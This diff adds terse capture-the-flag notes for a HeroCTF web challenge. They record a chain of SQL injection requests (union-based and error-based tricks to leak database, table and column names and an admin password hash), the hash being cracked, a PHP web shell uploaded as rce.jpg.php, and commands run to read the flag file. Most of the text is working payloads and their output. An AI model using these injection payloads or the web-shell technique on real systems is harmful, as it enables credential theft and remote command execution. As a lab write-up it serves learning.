@@ -1,0 +1,99 @@
+Search Book -> Access
+	http://chall2.heroctf.fr:8050/?page=manageBook&id=448
+
+http://chall2.heroctf.fr:8050/?page=manageBook&id=448'
+	.Sorry but an error occured, unknown book with id You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+MySQL
+
+GET /?page=manageBook&id=448+union+select+null,null,null,null,null,null,null,null,null--+- 
+	No error
+
+GET /?page=manageBook&id=1+union+select+version(),null,null,null,null,null,null,null,null--+- 
+	.Sorry but an error occured, unknown book with id 8.0.24
+
+'_' can be filtered
+
+Use Error-based
+
+# Database
+GET /?page=manageBook&id=1+union+select+updatexml(1,concat(0x7e,(select+database()),0x7e),1),null,null,null,null,null,null,null,null--+-
+	winventory
+
+# Tables
+GET /?page=manageBook&id=1+union+select+(select+1,2,3+from+users+where+Polygon(id)),null,null,null,null,null,null,null,null--+-
+	.Sorry but an error occured, unknown book with id Illegal non geometric '`winventory`.`users`.`id`' value found during parsing
+
+	=> users
+
+# Find number of columns
+GET /?page=manageBook&id=1+union+select+(SELECT+*+from+winventory.users)+in+(1),null,null,null,null,null,null,null,null--+-
+	.Sorry but an error occured, unknown book with id Operand should contain 6 column(s)
+
+
+# Find column names
+GET /?page=manageBook&id=1+union+select+(select+*+from+(select+*+from+users+as+a+join+users+as+b)as+c),null,null,null,null,null,null,null,null--+-
+	.Sorry but an error occured, unknown book with id Duplicate column name 'id'
+
+
+(select * from (select * from users as a join users as b using(id))as c)
+	.Sorry but an error occured, unknown book with id Duplicate column name 'pseudo'
+
+(select * from (select * from users as a join users as b using(id,pseudo))as c)
+	.Sorry but an error occured, unknown book with id Duplicate column name 'email'
+
+(select * from (select * from users as a join users as b using(id,pseudo,email))as c)
+	.Sorry but an error occured, unknown book with id Duplicate column name 'password'
+
+(select * from (select * from users as a join users as b using(id,pseudo,email,password))as c)
+	.Sorry but an error occured, unknown book with id Duplicate column name 'salt'
+
+(select * from (select * from users as a join users as b using(id,pseudo,email,password,salt))as c)
+	.Sorry but an error occured, unknown book with id Duplicate column name 'isAdmin'
+
+# Get email
+GET /?page=manageBook&id=1+union+select+(select+email+from+winventory.users+limit+1),null,null,null,null,null,null,null,null--+-
+	.Sorry but an error occured, unknown book with id admin@adminozor.fr
+
+# Get corresponding password
+GET /?page=manageBook&id=1+union+select+(select+password+from+winventory.users+where+email%3d'admin%40adminozor.fr'),null,null,null,null,null,null,null,null--+-
+	.Sorry but an error occured, unknown book with id 6431468f98f6552c3af0816307f91c06
+
+Crackstation
+	md5
+		6431468f98f6552c3af0816307f91c06 => urfaceismassive
+
+Login as admin
+	
+http://chall2.heroctf.fr:8050/?page=addImage
+	Can upload image
+
+Upload rce.jpg.php
+
+http://chall2.heroctf.fr:8050/adminSecretUploadFile/rce.jpg.php?c=id
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+ls /
+	bin
+	boot
+	client_accounting_secret.txt
+	dev
+	etc
+	home
+	lib
+	lib64
+	media
+	mnt
+	opt
+	proc
+	root
+	run
+	sbin
+	srv
+	sys
+	tmp
+	usr
+	var
+
+cat /client_accounting_secret.txt
+	Hero{sql1_t0_lf1_t0_rc3_b4d_s3cur1ty}
